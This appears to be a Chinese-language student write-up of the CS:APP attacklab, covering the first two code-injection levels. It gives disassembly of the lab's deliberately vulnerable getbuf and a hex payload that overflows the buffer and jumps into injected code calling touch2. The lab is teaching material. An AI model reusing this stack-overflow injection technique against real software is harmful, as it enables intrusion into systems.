

## 说明

此文件包含attacklab的一个实例的材料。

### ctarget

具有代码注入漏洞的Linux二进制文件。phase 1~3

### rtarget

具有面向返回的编程漏洞的Linux二进制文件。phase 4~5。

### cookie.txt



包含此实验室实例所需的4字节签名的文本文件。



### farm.c



此rtarget实例中存在gadget farm的源代码。你

可以编译（使用flag-Og）并反汇编它来查找gadget。

### hex2raw

生成字节序列的实用程序。见实验室文件

## Part I: Code Injection Attacks

### Level 1

```c
void test()
{
    int val; 
	val = getbuf(); 
	printf("No exploit. Getbuf returned 0x%x\n",val);
}
void touch1() 
{ 
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");         validate(1);
    exit(0);
}
```

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop


```

```asm

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp# 5个字,40字节的buffer
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

```

```c
char* gets(char* dest)
{
    int c=getchar();
    char* p=dest;
    while(c!=EOF&&c!='\n')
    {
        *p++=c;//priority:++(x) > *x > (x)++,*p++ means(*p)++
        c=getchar();
    }
    *p='\0';
    return dest;
}
```



```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

`0xc01740`

### Level 2

```c
void touch2(unsigned val)
{
    vlevel2=2;
    if(val==cookie)
    {
        printf("Touch2!:You called touch2(0x%.8x)\n",val);
        validate(2);
    }else{
        printf("Misfire:you called touch2(0x%.8x)\n",val);
        fail(2);
    }
    exit(0);
}
```



```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```



```asm
0000000000401a40 <Gets>:
  401a40:	41 54                	push   %r12
  401a42:	55                   	push   %rbp
  401a43:	53                   	push   %rbx
  401a44:	49 89 fc             	mov    %rdi,%r12
  401a47:	c7 05 b3 36 20 00 00 	movl   $0x0,0x2036b3(%rip)        # 605104 <gets_cnt>
  401a4e:	00 00 00 
  401a51:	48 89 fb             	mov    %rdi,%rbx
  401a54:	eb 11                	jmp    401a67 <Gets+0x27>
  401a56:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  401a5a:	88 03                	mov    %al,(%rbx)
  401a5c:	0f b6 f8             	movzbl %al,%edi
  401a5f:	e8 3c ff ff ff       	callq  4019a0 <save_char>
  401a64:	48 89 eb             	mov    %rbp,%rbx
  401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
  401a6e:	e8 4d f3 ff ff       	callq  400dc0 <_IO_getc@plt>
  401a73:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a76:	74 05                	je     401a7d <Gets+0x3d>
  401a78:	83 f8 0a             	cmp    $0xa,%eax
  401a7b:	75 d9                	jne    401a56 <Gets+0x16>
  401a7d:	c6 03 00             	movb   $0x0,(%rbx)
  401a80:	b8 00 00 00 00       	mov    $0x0,%eax
  401a85:	e8 6e ff ff ff       	callq  4019f8 <save_term>
  401a8a:	4c 89 e0             	mov    %r12,%rax
  401a8d:	5b                   	pop    %rbx
  401a8e:	5d                   	pop    %rbp
  401a8f:	41 5c                	pop    %r12
  401a91:	c3                   	retq   

```



`cookie:0x59b997fa`

`&touch2:4017ec`

`mov (cookie) rdi; push $touch2; ret; `



```asm
0x5561dc78:     0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0x48 #
0x5561dc80:     0xc7    0x44    0x24    0x00    0xec    0x17    0x40    0x00
0x5561dc88:     0xc3    0x37    0x38    0x39    0x30    0x31    0x32    0x33
0x5561dc90:     0x34    0x35    0x36    0x37    0x38    0x39    0x30    0x31
0x5561dc98:     0x32    0x33    0x34    0x35    0x36    0x37    0x38    0x39
0x5561dca0:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

`48 C7 C7 FA 97 B9 59 48 C7 44 24 00 EC 17 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00`

